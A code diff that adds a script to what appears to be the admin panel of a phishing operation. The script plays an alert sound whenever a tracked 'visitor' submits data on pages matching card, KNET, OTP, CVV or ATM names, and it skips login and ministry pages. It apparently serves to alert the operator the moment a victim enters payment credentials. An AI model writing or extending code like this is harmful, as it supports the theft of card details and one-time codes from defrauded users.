@@ -4372,3 +4372,58 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   (function loop(){ top(); requestAnimationFrame(loop); })();
 })();
 </script>
+<script id="kddF122">
+(function(){
+  if (window.__f122) return; window.__f122 = 1;
+  try { if (document.title.indexOf('F122') < 0) document.title += ' ·F122'; } catch(e){}
+
+  /* 1) اسكت كل مشغّلات الضفدع القديمة (الشرط المعطوب + FIX113) */
+  var _fa = null, _real = null;
+  try { _fa = frogAudio; } catch(e) { _fa = null; }
+  if (_fa && _fa.play) {
+    _real = _fa.play.bind(_fa);
+    _fa.play = function(){ return Promise.resolve(); };
+  }
+
+  /* 2) الصفحات المسموح فيها فقط: ملخص الدفع / البطاقة / كي نت / OTP / CVV / ATM */
+  function ok(p){
+    p = String(p || '');
+    if (!p) return false;
+    if (/الصفحة الرئيسية/.test(p)) return false;
+    if (p === '/' || p === 'home') return false;
+    if (/بيانات نفاذ|تسجيل دخول|تحديث المعلومات|اسم المستخدم|وزار|moh/i.test(p)) return false;
+    return /ملخص|summary|دفع|بطاقة|card|كي\s*نت|knet|otp|رمز|cvv|atm/i.test(p);
+  }
+
+  var _last = 0;
+  function fire(){
+    var t = Date.now();
+    if (t - _last < 1000) return;
+    _last = t;
+    try {
+      if (_real) { _fa.currentTime = 0; _real().catch(function(){}); }
+      else { new Audio('/admin/frog.mp3').play().catch(function(){}); }
+    } catch(e){}
+  }
+
+  /* 3) استمع فقط للوصول الحقيقي للمعلومات */
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f122h) return;
+      s.__f122h = 1;
+      s.on('visitor:dataSubmitted', function(x){
+        try {
+          var d = x && x.data, v = x && x.visitor;
+          var p = (d && d.page) || (v && v.page) || '';
+          if (ok(p)) fire();
+        } catch(e){}
+      });
+      s.on('visitor:pageChanged', function(x){
+        try { if (ok(x && x.page)) fire(); } catch(e){}
+      });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 400);
+})();
+</script>
